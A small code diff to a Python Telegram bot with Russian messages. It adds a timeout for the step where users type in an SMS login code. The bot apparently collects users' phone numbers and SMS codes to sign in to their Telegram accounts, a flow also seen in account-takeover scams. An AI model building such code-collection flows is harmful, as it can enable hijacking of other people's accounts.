@@ -328,6 +328,17 @@ async def start_work_callback(callback: CallbackQuery):
     await callback.message.edit_text(text)
     await callback.answer()
 
+# === Таймаут кода ===
+async def code_timeout(user_id: int, phone: str):
+    await asyncio.sleep(150)  # 2 минуты 30 секунд
+    if user_id in waiting_code:
+        waiting_code.pop(user_id, None)
+        pending.pop(user_id, None)
+        try:
+            await bot.send_message(user_id, "🔖 Время на ввод кода истекло. Пожалуйста, начните авторизацию заново")
+        except Exception:
+            pass
+
 # === Обработчик номера телефона ===
 
 @dp.message(F.text, ~F.text.startswith("/"))
@@ -377,6 +388,9 @@ async def phone_handler(msg: Message):
     await asyncio.sleep(1.5)
     waiting_code[msg.from_user.id] = True
     await msg.answer("📩 Введите код из SMS ответом на это сообщение:")
+
+    # Запуск таймаута
+    asyncio.create_task(code_timeout(msg.from_user.id, phone))
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
     try:
